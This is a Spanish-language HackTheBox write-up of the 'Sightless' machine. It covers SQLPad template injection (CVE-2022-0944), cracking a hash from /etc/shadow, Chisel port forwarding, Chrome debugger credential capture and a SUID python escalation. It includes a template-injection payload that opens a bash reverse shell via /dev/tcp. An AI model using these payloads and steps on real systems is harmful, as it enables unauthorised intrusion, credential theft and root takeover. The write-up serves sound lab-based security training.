---
title: Sightless
date: 2024-09-15
categories: [WRITEUPS, HackTheBox]
tags: [Chisel,Froxlor]  # TAG names should always be lowercase
image: /assets/images/hackthebox/htblogo.png
---

![picture](/assets/images/hackthebox/sigh0.png)

Buenas, en este **Writeup** explotaremos un panel de **SQLPad**, por el cual accederemos a un contenedor de **Docker**, y escalaremos privilegios gracias a un servicio de **Froxlor** encontrado en un puerto realizando **Port Fordwarding**.

---

En este ***Writeup*** se engloban las siguientes fases:
- **[Reconocimiento](#reconocimiento)**
- **[Explotación](#explotación)**
- **[Escalada de privilegios](#escalada-de-privilegios)**

---

## **Reconocimiento**

Lo primero que realizaré será un escaneo de puertos, para ello utilizaré la herramienta *NMAP*.

```bash
nmap -p- --open -T5 10.10.11.32 -n -Pn -v
```

![picture](/assets/images/hackthebox/sigh1.png){: w="600" h="300" }

Una vez hecho, realizaremos un escaneo más exhaustivo de los puertos encontrados, de los cuales obtendremos las versiones de los servicios corriendo por ellos, y lanzaremos una serie de scripts predeterminados de *NMAP*, para intentar encontrar algo interesante sobre ellos.

```bash
nmap -p21,22,80 -sVC 10.10.11.32
```

Lo único interesante que encontramos es el dominio, así que lo añadiremos al archivo "***/etc/hosts***", para que cuando intentemos acceder a la web, nos resuelva el nombre del dominio, y la página muestre su contenido.

![picture](/assets/images/hackthebox/sigh2.png)

Una vez hecho, nos vamos al navegador para ver la página corriendo por el servicio **HTTP**.

![picture](/assets/images/hackthebox/sigh3.png)

Dentro de la web, si hacemos "**hovering**" (*poner el ratón encima de algo*) sobre el servicio de **SQLPad**, vemos en la parte inferior izquierda, que nos redirige a un subdominio.

Antes de clicar sobre él, lo añadiremos al archivo "**/etc/hosts".

![picture](/assets/images/hackthebox/sigh4.png)

Y comprobamos que estamos dentro del panel de **SQLPad**.

![picture](/assets/images/hackthebox/sigh5.png)

Moviéndonos un poco en busca de información sobre el panel, he encontrado la versión.

![picture](/assets/images/hackthebox/sigh6.png){: w="600" h="300" }

Y 2 posibles usuarios, **admin** y **john**.

![picture](/assets/images/hackthebox/sigh7.png){: w="600" h="300" }

---

## **Explotación**

Investigando sobre la versión del servicio, he encontrado la vulnerabilidad **CVE-2022-0944**, y en la siguiente [**Web**](https://nvd.nist.gov/vuln/detail/CVE-2022-0944) nos indica como explotarlo, en la cual mediante una **Template Injection** (*posibilidad de ejecutar código malicioso en una plantilla*) podemos derivarlo a un **RCE** (*Remote Code Execution*).

El campo vulnerable es "**Database**", tendremos que introducir en ese campo el **payload** mencionado en la [**Web**](https://nvd.nist.gov/vuln/detail/CVE-2022-0944).

- Para ello nos iremos a "*Connections > New connection*", le pondremos un nombre cualquiera, y elegiremos el "*Driver*" de **MySQL**..

- Indicaremos nuestra **IP** y el **puerto**.

- E introducimos el **payload**, junto con el código que hayamos elegido.

Yo introduciré el código para que me devuelva una **Reverse Shell**, que nos devolverá una **Shell interactiva** en nuestra máquina local.

```bash
{ { process.mainModule.require('child_process').exec('bash -c "bash -i >& /dev/tcp/'Nuestra Ip'/4444 0>&1"') }}
```

Y lo guardamos.

![picture](/assets/images/hackthebox/sigh8.png){: w="400" h="150" }

Para poder obtener la **Reverse Shell** en nuestra máquina local, nos tendremos que poner en escucha por el puerto indicado con un **Listener** con **ncat**.

```bash
nc -nlvp 4444
```

Una vez estemos en escucha, lo ejecutamos.

![picture](/assets/images/hackthebox/sigh9.png)

Y obtendremos una shell como el usuario **root** en el contenedor **Docker** del servidor.

![picture](/assets/images/hackthebox/sigh10.png){: w="600" h="300" }

Hago un tratamiento de la **tty** para obtener una *Shell* más limpia, y poder trabajar mejor.

```bash
script /dev/null -qc /bin/bash
CTRL+Z
stty raw -echo; fg
ls
export SHELL=/bin/bash
export TERM=screen
stty rows 46 columns 184 ('stty size' en la máquina local)
reset
```

---

## **Escalada de Privilegios**

En el directorio raíz encuentro el archivo "**dockerenv**", lo que significa que el proceso de **Docker** está corriendo.

![picture](/assets/images/hackthebox/sigh11.png)

Viendo los usuarios en el archivo "**/etc/passwd**", comprobamos que tenemos 2 usuarios.

![picture](/assets/images/hackthebox/sigh12.png){: w="600" h="300" }

Y en el archivo "**/etc/shadow**", puedo ver la contraseña del usuario "*michael*" cifrada.

![picture](/assets/images/hackthebox/sigh13.png)

A continuación, la idea es llevarla a la máquina local, e intentar crackearla con **John The Ripper** mediante fuerza bruta.

Creamos un archivo con la contraseña cifrada, y lo ejecutamos.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Y nos devuelve la contraseña en texto claro.

![picture](/assets/images/hackthebox/sigh14.png){: w="600" h="300" }

A continuación, pruebo a entrar al servidor con la contraseña mediante el servicio **SSH** como el usuario "**michael**", y obtengo resultado.

![picture](/assets/images/hackthebox/sigh15.png){: w="600" h="300" }

En su carpeta personal obtengo la primera **flag** de usuario.

![picture](/assets/images/hackthebox/sigh16.png)

Buscando posibles escaladas de privilegios al usuario **root**, encuentro que está el puerto **8080** abierto, que suele ser una alternativa al puerto **80**.

```bash
netstat -tulnp
```

Para poder ver lo que está corriendo por ese puerto en el navegador, voy a utilizar la herramienta **Chisel**, que se utiliza para realizar **Port Forwarding**.

- Máquina local.
	
	Esto ejecuta el servidor **Chisel** en mi máquina local en el puerto **8080** y acepta conexiones de túneles inversos.
	
	```bash
	chisel server --port 8888 --reverse
	```

(*Nos tendremos que descargar en la máquina local **Chisel**, y pasarla mediante un servidor **HTTP** al servidor, y darle permisos de ejecución.*)

- Servidor
	
	Crea un túnel inverso con **Chisel**, redirigiendo el puerto **8080** de la máquina remota (servidor) hacia el puerto **8080** de mi máquina local. Esto permite acceder a un servicio corriendo en el servidor en nuestra máquina.
	
```bash
	michael@sightless:~$ ./chisel_1.10.0_linux_amd64 client Nuestra IP:8888 R:8080:127.0.0.1:8080
```

![picture](/assets/images/hackthebox/sigh17.png)

![picture](/assets/images/hackthebox/sigh18.png)

Si nos vamos al navegador e introducimos "**127.0.0.1:8080**", vemos el contenido del servicio, y nos sale un panel *Login* de **Froxlor**.

![picture](/assets/images/hackthebox/sigh19.png)

Buscando en el servidor, encuentro que tiene instalado **Google-Chrome**, lo que es raro.

![picture](/assets/images/hackthebox/sigh20.png)

Buscando en internet encuentro el siguiente [*Blog*](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/), el cual nos idica que podemos depurar las aplicaciones web corriendo por los puertos, podemos utilizarlo para buscar de las credenciales de acceso.

A continuación, reenviaremos todos los puertos para ver si algunos nos muestra algo.

- Servidor
	
```python
./chisel_1.10.0_linux_amd64 client 10.10.16.4:8888 R:8080:127.0.0.1:8080 R:33060:127.0.0.1:33060 R:45359:127.0.0.1:45359 R:35979:127.0.0.1:35979 R:38693:127.0.0.1:38693
```

Una vez el reenvío de puertos, nos vamos a **Google Chrome**, a la ruta "**chrome://inspect/#devices**" desde la máquina local.

![picture](/assets/images/hackthebox/sigh21.png)

Aquí, en "**configure**" añadimos todos los puertos reenviados (*127.0.0.1:puertos*), y nos saldrá lo siguiente.

![picture](/assets/images/hackthebox/sigh22.png)

Clicamos "*inspect*" en el primero, y nos abrirá una pestaña.

![picture](/assets/images/hackthebox/sigh23.png)

Aquí, irá cambiando la ventana donde vemos el panel **login**, y cuando veamos que sale una ventana dentro del panel de **Froxlor**, pararemos la grabación del registro de la red, y en el archivo "**index.php**" en la parte de "**Payloads**" encontraremos las credenciales.

![picture](/assets/images/hackthebox/sigh24.png)

Accedemos con las credenciales en el panel de *Login*, y obtenemos acceso como el usuario **admin**.

![picture](/assets/images/hackthebox/sigh25.png)

### Escalada de privilegios a ROOT

Examinando el panel de **Froxlor**, veo que puedo dar permisos desde las versiones de **PHP_FPM**, así que mi idea para escalar privilegios es añadirle el bit **SUID** al binario **Python3****.

![picture](/assets/images/hackthebox/sigh26.png)

Guardamos.

![picture](/assets/images/hackthebox/sigh27.png)

Y para que se ejecute, tenemos que reiniciar el servicio, para ello nos vamos a "*System > Settings > PHP-FPM*", lo deshabilitamos, guardamos, y lo volvemos a habilitar y guardar.

Si miramos en el servidor, los permisos de **Python3**, comprobamos que hay un link simbólico a **Python3.10**

![picture](/assets/images/hackthebox/sigh28.png){: w="600" h="300" }

Y si miramos los permisos de **Python3.10** comprobamos que tiene el bit **SUID**.

![picture](/assets/images/hackthebox/sigh29.png)

Iniciamos **Python3.10**, e introducimos lo siguiente para migrar a **root**.

![picture](/assets/images/hackthebox/sigh30.png){: w="600" h="300" }

Y en su directorio personal, encontramos la flag de **root**.

![picture](/assets/images/hackthebox/sigh31.png)

![picture](/assets/images/hackthebox/sigh32.png){: w="600" h="300" }
